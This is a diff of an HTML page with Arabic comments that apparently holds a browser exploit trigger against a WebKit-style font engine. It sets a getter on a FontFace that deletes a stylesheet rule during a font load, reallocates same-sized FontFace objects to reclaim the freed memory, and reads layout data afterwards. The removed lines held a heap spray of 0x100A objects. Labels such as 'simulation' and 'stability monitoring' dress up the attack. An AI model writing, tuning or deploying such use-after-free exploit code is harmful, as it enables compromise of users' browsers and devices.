@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تفكيك جمود المعمارية - الهيكلية المستقرة</title>
+    <title>فحص المسار الصافي - تفكيك الجمود</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
@@ -17,8 +17,8 @@
 </head>
 <body>
 
-    <h2>مراقبة استقرار معمارية الـ Heap التاريخية</h2>
-    <div id="custom-console">[نظام المحاكاة نشط]: جاري تهيئة البيئة...</div>
+    <h2>مراقبة مسار معالجة الخطوط الصافي (Minimal Target Loop)</h2>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -32,24 +32,16 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // إعداد المصفوفة الأساسية وتحديد حجم الحشو المتوافق تاريخياً مع معمارية المتصفح
-        var bad_fonts = [];
-        var SPRAY_FONTS = 0x100A; // القيمة الافتراضية المستقرة من ملف webkit.js
+        var control_storage = [];
 
-        function setupHistoricalEnvironment() {
+        function runMinimalAnalysis() {
             consoleElement.innerHTML = "";
-            screenLog("بدء تهيئة الذاكرة التمهيدية (Heap Pre-Padding)...");
+            screenLog("بدء تشغيل الفحص النظيف (بدون حشو مسبق)...");
 
             try {
-                // حقن مسبق هادئ ومنظم لتجهيز قسم الخطوط المعزول
-                for (var i = 0; i < SPRAY_FONTS; i++) {
-                    bad_fonts.push(new FontFace("font1", "", {}));
-                }
-                screenLog(`تم تجهيز ${SPRAY_FONTS} كائن خط بنجاح في الذاكرة المستقرة.`);
-
-                // إعداد كائن الفحص الأساسي
+                // إعداد الكائن المستهدف مباشرة لضمان سلامة الـ Heap البدئي
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                bad_fonts.push(A);
+                document.fonts.add(A);
                 void A.loaded;
 
                 let fired = false;
@@ -60,35 +52,41 @@
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي للـ Getter بنجاح !!", "warn");
+                            screenLog("!! تم رصد وتفعيل المقاطعة بنجاح !!", "warn");
                             
                             try {
+                                // تدمير القاعدة التنسيقية لتوليد الفجوة الهيكلية
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف القاعدة التنسيقية وتوليد الفجوة الهيكلية.");
+                                screenLog("تم حذف القاعدة التنسيقية بنجاح.");
                             } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
                             
-                            // نترك المتصفح يكمل التنفيذ دون حشو مصفوفات عشوائية لمنع الـ OOM
+                            // تخصيص عنصرين فقط كعينة فحص نوعية بحجم متوافق (0xb8) لمنع الـ OOM والجمود
+                            screenLog("حقن عينة فحص مصغرة جداً في الـ Heap...");
+                            control_storage.push(new FontFace("target1", "", {}));
+                            control_storage.push(new FontFace("target2", "", {}));
+                            
+                            // إغلاق الدالة وتمرير التنفيذ فوراً دون تأخير
                             setTimeout(() => {
-                                screenLog("محاولة القراءة المتأخرة للتحقق من استجابة المحرك...");
+                                screenLog("محاولة قراءة الـ Offset بعد خروج المكدس...");
                                 let offset = document.body.offsetTop;
                                 screenLog("قيمة الـ Offset المسترجعة: " + offset);
-                            }, 50);
+                            }, 30);
                         }
                         return function(resolve) { if (resolve) resolve(); };
                     }
                 });
 
-                screenLog("إطلاق طلب معالجة الخط عبر الـ Layout Pipeline...");
+                screenLog("إطلاق طلب المعالجة المباشر عبر الـ Layout Pipeline...");
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
-                screenLog("خطأ عام في النظام: " + err.message, "warn");
+                screenLog("خطأ عام: " + err.message, "warn");
             }
         }
 
-        // جدولة التشغيل بعد مهلة استقرار كافية لمنع تداخل عمليات التحميل السابقة
         window.onload = () => {
-            setTimeout(setupHistoricalEnvironment, 1500);
+            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية للاستقرار...");
+            setTimeout(runMinimalAnalysis, 1500);
         };
     </script>
 </body>
